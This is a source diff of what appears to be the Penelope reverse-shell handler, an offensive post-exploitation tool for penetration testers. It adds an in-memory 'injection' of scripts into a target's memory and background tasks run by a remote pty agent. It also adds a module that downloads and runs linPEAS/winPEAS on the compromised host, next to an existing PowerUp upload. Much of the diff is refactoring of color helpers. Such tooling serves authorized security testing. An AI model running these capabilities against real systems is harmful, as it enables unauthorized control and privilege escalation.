 				exit_code = self.responses.get()
 
@@ -2312,24 +2346,31 @@ class Session:
 						return []
 					progress_bar.update(len(chunk))
 
-				logger.info(paint("--- Remote unpacking...", 'blue'))
+				logger.info(paint("--- Remote unpacking...").blue)
 				dest = f"-C {remote_path}" if remote_path else ""
 				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
 				response = self.exec(cmd, value=True, preserve_dir=True)
 				exit_code = self.exec("echo $temp", value=True)
 				self.exec(f"rm {temp}")
 
-			altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
+			if not pipe:
+				altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
 
-			if not int(exit_code):
-				for item in altnames:
-					logger.info(f"Uploaded => {paint(shlex.quote(str(item)), 'yellow')}")
+				if not int(exit_code):
+					for item in altnames:
+						logger.info(f"Uploaded => {paint(shlex.quote(str(item))).yellow}")
+				else:
+					logger.error(f"Upload failed")
+					print(paint(textwrap.indent(response.decode(), " *  ")).yellow)
+					return []
+
+				return altnames
 			else:
-				logger.error(f"Upload failed")
-				print(paint(textwrap.indent(response.decode(), " *  "), 'yellow'))
-				return []
-
-			return altnames
+				logger.info(
+					f"{paint('💉 Injected ').blue}{paint(local_item_path).yellow_DIM}"
+					f"{paint().blue_NORMAL} to target's {paint('memory').red_DIM}"
+				)
+				return True
 
 		elif self.OS == 'Windows':
 			logger.warning("Upload on Windows shells is not implemented yet")
@@ -2385,7 +2426,7 @@ class Session:
 
 		return True
 
-	def task(self, cmdline, _stdout=None, _stderr=None, localscript=None):
+	def task(self, cmd, _stdout=None, _stderr=None, localscript=None):
 		if self.OS == "Unix":
 			if self.agent:
 				local_task_folder = self.directory / "tasks"
@@ -2408,16 +2449,30 @@ class Session:
 				else:
 					errfile = outfile
 
+				if localscript:
+					if not self.upload(cmd, pipe=taskid):
+						return False
+					cmd = self.responses.get().decode()
+
 				self.tasks[taskid] = {
-					'command':cmdline,
+					'command':cmd,
 					'streams':{
-						"1": open(outfile, "ab"),
-						"2": open(errfile, "ab")
+						"1": open(outfile, "ab", buffering=0),
+						"2": open(errfile, "ab", buffering=0)
 					}
 				}
-				self.send(Messenger.message(Messenger.TASK, (taskid + cmdline).encode()))
-				logger.info(f"Task assigned with ID: {paint(taskid, 'yellow')}")
+				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
+				self.send(Messenger.message(Messenger.TASK, (taskid + cmd).encode()))
+				self.tasks[taskid]['pid'] = self.responses.get().decode()
+
+				logger.info(
+					f"Task assigned with ID: {paint(taskid).yellow} "
+					f"{paint('(PID: ' + self.tasks[taskid]['pid'] + ')').cyan_DIM}"
+				)
 				return self.tasks[taskid]
+			else:
+				logger.warning("Please upgrade the shell first") #TEMP
+				return False
 
 		elif self.OS == 'Windows':
 			logger.warning("Tasks in Windows shells are not implemented yet")
@@ -2429,8 +2484,10 @@ class Session:
 			current_num = len(core.hosts[self.name])
 			if 0 < current_num < options.maintain:
 				session = core.hosts[self.name][-1]
-				logger.warning(paint(f" --- Session {session.id} is trying to maintain {options.maintain} "
-					f"active shells on {self.name} ---", 'blue'))
+				logger.warning(paint(
+						f" --- Session {session.id} is trying to maintain {options.maintain} "
+						f"active shells on {self.name} ---"
+					).blue)
 				session.spawn()
 				return True
 		return False
@@ -2450,7 +2507,7 @@ class Session:
 				sessions = ', '.join([str(session.id) for session in self.need_control_sessions])
 				if thread_name == 'Menu':
 					logger.warning(
-		f"Cannot kill Session {self.id} as the following sessions depend on it: {sessions}"
+						f"Cannot kill Session {self.id} as the following sessions depend on it: {sessions}"
 					)
 					return False
 				else:
@@ -2485,13 +2542,12 @@ class Session:
 		self.socket.close()
 
 		if not self.OS:
-			message = f"Invalid shell from {paint(self.name, 'RED', 'white')}{paint('', 'red')} 🙄\r"
-
+			message = f"Invalid shell from {paint(self.name).white_RED} 🙄\r"
 		else:
 			message = f"Session [{self.id}] died..."
 
 			if not core.hosts[self.name]:
-				message += f" We lost {paint(self.name, 'RED', 'white')} {paint('', 'red')} 💔"
+				message += f" We lost {paint(self.name).white_RED} 💔"
 
 		if hasattr(menu, 'kill_wait'):
 			menu.kill_wait.put(message)
@@ -2652,6 +2708,9 @@ def agent():
 	import tarfile
 	import subprocess
 
+	import threading
+
+	SHELL = "{}"
 	NET_BUF_SIZE = 8192
 	OLD = sys.version_info < (2, 6)
 	if not OLD:
@@ -2673,14 +2732,20 @@ def agent():
 				respond(Messenger.RESPONSE, str(e).encode())
 		return inner
 
+	def write_to_pipe(pipe, data):
+		os.write(pipe, data)
+		os.close(pipe)
+
 	pid, master_fd = pty.fork()
 	if pid == pty.CHILD:
-		os.execlp("{}", "-i") # TEMP # TODO
+		os.execlp(SHELL, "-i") # TEMP # TODO
 
 	try:
-		fds = [master_fd, pty.STDIN_FILENO]
 		tasks = dict()
-		while True: # while fds, while True
+		pipes = dict()
+		agent.pipe_name = None
+		fds = [master_fd, pty.STDIN_FILENO]
+		while True:
 			rfds, wfds, xfds = select.select(fds, [], [])
 
 			for readable in rfds:
@@ -2707,15 +2772,36 @@ def agent():
 						elif _type == Messenger.UPLOAD:
 							try:
 								if not OLD:
-									tarfile.open(mode='r:gz', fileobj=io.BytesIO(_value)).extractall()
+									tar = tarfile.open(mode='r:gz', fileobj=io.BytesIO(_value))
 								else:
 									tmpf = tempfile.TemporaryFile()
 									tmpf.write(_value)
 									tmpf.seek(0)
-									x = tarfile.open(mode='r:gz', fileobj=tmpf)
-									x.errorlevel=1
-									x.extractall()
+									tar = tarfile.open(mode='r:gz', fileobj=tmpf)
+									tar.errorlevel=1
+
+								if not agent.pipe_name:
+									tar.extractall()
+								else:
+									pipes[agent.pipe_name.encode()] = os.pipe()
+									file = tar.extractfile(tar.members[0])
+
+									firstline = file.readline()[:-1]
+									if firstline[:2] == '#!'.encode():
+										shebang = firstline[2:]
+									else:
+										shebang = SHELL.encode()
+
+									file.seek(0)
+									data = file.read()
+									threading.Thread(
+										target=write_to_pipe,
+										args=(pipes[agent.pipe_name.encode()][1], data)
+										).start()
+								tar.close()
+								if OLD:
 									tmpf.close()
+
 							except: #TODO
 								_, e, _ = sys.exc_info()
 								respond(Messenger.RESPONSE, str(e).encode())
@@ -2723,6 +2809,9 @@ def agent():
 							else:
 								respond(Messenger.RESPONSE, "OK".encode())
 								respond(Messenger.RESPONSE, str(0).encode())
+								if agent.pipe_name:
+									respond(Messenger.RESPONSE, shebang)
+									agent.pipe_name = None
 
 						elif _type == Messenger.DOWNLOAD:
 							try:
@@ -2769,13 +2858,19 @@ def agent():
 						elif _type == Messenger.TASK:
 							taskid = _value[:8]
 							cmd = _value[8:]
-							pipe = subprocess.Popen(cmd.decode(), shell=True, 
+							_stdin = None
+							if taskid in pipes:
+								_stdin = pipes[taskid][0]
+							process = subprocess.Popen(cmd.decode(), shell=True, stdin=_stdin,
 								stdout=subprocess.PIPE, stderr=subprocess.PIPE) # TODO stderr
-							out = pipe.stdout.fileno()
-							err = pipe.stderr.fileno()
+							if _stdin:
+								del pipes[taskid]
+							out = process.stdout.fileno()
+							err = process.stderr.fileno()
 							fds.extend([out, err])
 							tasks[out] = taskid + "1".encode()
 							tasks[err] = taskid + "2".encode()
+							respond(Messenger.RESPONSE, str(process.pid).encode())
 
 				elif readable in tasks:
 					data = os.read(readable, NET_BUF_SIZE)
@@ -2803,24 +2898,43 @@ caller = lambda: inspect.stack()[2].function
 rand = lambda _len: ''.join(random.choice(string.ascii_letters) for i in range(_len))
 bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
 chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
-pathlink = lambda filepath: (f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
-		f'/\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07')
+pathlink = lambda filepath: (
+	f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
+	f'/\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07'
+)
 
-def Open(item):
-	error = subprocess.Popen(
-		({'Linux':'xdg-open', 'Darwin':'open'}[OS], item),
+def Open(*args, terminal=False):
+	if not DISPLAY:
+		logger.error("No available display to open the file")
+		return False
+
+	if not terminal:
+		program = {'Linux':'xdg-open', 'Darwin':'open'}[OS]
+	else:
+		program = 'x-terminal-emulator'
+
+	if not shutil.which(program):
+		logger.error(f"Cannot open window: '{program}' binary does not exist")
+		return False
+
+	process = subprocess.Popen(
+		(program, *args),
 		stdin=subprocess.DEVNULL,
 		stdout=subprocess.DEVNULL,
 		stderr=subprocess.PIPE
-		).stderr.read()
-	if error:
-		logger.error(error.decode())
-		return False
+	)
+	r, _, _ = select.select([process.stderr], [], [], .01)
+	if process.stderr in r:
+		error = os.read(process.stderr.fileno(), 1024)
+		if error:
+			logger.error(error.decode())
+			return False
+
 	return True
 
 def ask(text):
 	try:
-		return input(f"\r{paint(f'[?] {text}: ', 'yellow')}")
+		return input(f"\r{paint(f'[?] {text}: ').yellow}")
 
 	except EOFError:
 		return ask(text)
@@ -2829,9 +2943,9 @@ class Interfaces:
 
 	def __str__(self):
 		table = Table(joinchar=' : ')
-		table.header = [paint('Interface', 'MAGENTA'), paint('IP Address', 'MAGENTA')]
+		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
 		for name, ip in self.list.items():
-			table += [paint(name, 'cyan'), paint(ip, 'yellow')]
+			table += [paint(name).cyan, paint(ip).yellow]
 		return str(table)
 
 	def oneLine(self):
@@ -2914,7 +3028,7 @@ class Table:
 
 		new_row = []
 		for index, element in enumerate(row):
-			if not isinstance(element, str):
+			if not isinstance(element, (str, paint)):
 				element = str(element)
 			elem_length = len(element)
 			new_row.append(element)
@@ -2976,27 +3090,35 @@ class PBar:
 	def terminate(self):
 		print("\x1b[?25h")
 
-class Colored(str):
-	def __init__(self, colored_text):
-		self.colored_text = colored_text
-	def __len__(self):
-		return len(re.sub(r'\x1b\[\d+(;\d+)*m', '', self.colored_text))
-
-class Color:
+class paint:
 	codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
-	colors = ('black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white')
+	colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'white':7, 'orange':136}
 	escape = lambda codes: f"\x1b[{codes}m"
 
-	def __init__(self):
-		__class__.codes.update({color:code for code, color in enumerate(__class__.colors, 30)})
-		__class__.codes.update({color.upper():code for code, color in enumerate(__class__.colors, 40)})
+	def __init__(self, text=None):
+		self.text = str(text) if text is not None else None
+		self.colored_text = None
 
-	def __call__(self, text, *colors, reset=False):
-		code_sequence=';'.join([str(__class__.codes[color]) for color in colors])
-		prefix = __class__.escape(code_sequence) if code_sequence else ''
-		suffix = __class__.escape(__class__.codes['RESET']) if (text and prefix) or reset else ''
-		return Colored(f"{prefix}{text}{suffix}")
+	def __str__(self):
+		return self.colored_text
 
+	def __len__(self):
+		return len(self.text)
+
+	def __add__(self, text): #TODO
+		return str(self) + str(text)
+
+	def __getattr__(self, attr):
+		colors = []
+		for color in attr.split('_'):
+			if color in __class__.codes:
+				colors.append(str(__class__.codes[color]))
+			else:
+				prefix = "3" if color in __class__.colors else "4"
+				colors.append(prefix + "8;5;" + str(__class__.colors[color.lower()]))
+		content = self.text + __class__.escape(__class__.codes['RESET']) if self.text is not None else ''
+		self.colored_text = __class__.escape(';'.join(colors)) + content
+		return self
 
 class CustomFormatter(logging.Formatter):
 	TEMPLATES = {
@@ -3010,10 +3132,10 @@ class CustomFormatter(logging.Formatter):
 		template = __class__.TEMPLATES[record.levelno]
 		prefix = "\r" if core.attached_session is None else ""
 		suffix = "\r" if core.attached_session is not None else ""
-		thread = " " + paint(threading.current_thread().name, 'CYAN', 'white', reset=True)\
+		thread = " " + paint(threading.current_thread().name).white_CYAN\
 			if record.levelno is logging.DEBUG or options.debug else ""
 		text = prefix + f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}" + suffix
-		return paint(text, template['color'])
+		return getattr(paint(text), template['color'])
 
 ##########################################################################################################
 
@@ -3038,6 +3160,7 @@ def WinResize(num, stack):
 OS = platform.system()
 OSes = {'Unix':'🐧', 'Windows':'💻'}
 TTY_NORMAL = termios.tcgetattr(sys.stdin)
+DISPLAY = 'DISPLAY' in os.environ
 NET_BUF_SIZE = 8192
 LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 MESSENGER = inspect.getsource(Messenger)
@@ -3049,7 +3172,6 @@ signal.signal(signal.SIGINT, ControlC)
 signal.signal(signal.SIGWINCH, WinResize)
 
 ## CREATE BASIC OBJECTS
-paint = Color()
 core = Core()
 menu = MainMenu()
 
@@ -3088,6 +3210,17 @@ class Options:
 						'upload https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'
 					]
 				}
+			},
+			'peass-ng':{
+				'description':'Run the latest version of PEASS-ng in the background',
+				'actions':{
+					'Unix':[
+						'task https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
+					],
+					'Windows':[
+						'task https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
+					]
+				}
 			}
 		}
 		self.configfile = self.basedir / 'penelope.conf'
@@ -3100,7 +3233,7 @@ class Options:
 		return super().__getattribute__(option)
 
 	def __setattr__(self, option, value):
-		show = logger.error if 'logger' in globals() else lambda x: print(paint(x, 'red'))
+		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
 		level = __class__.log_levels.get(option)
 
 		if level:
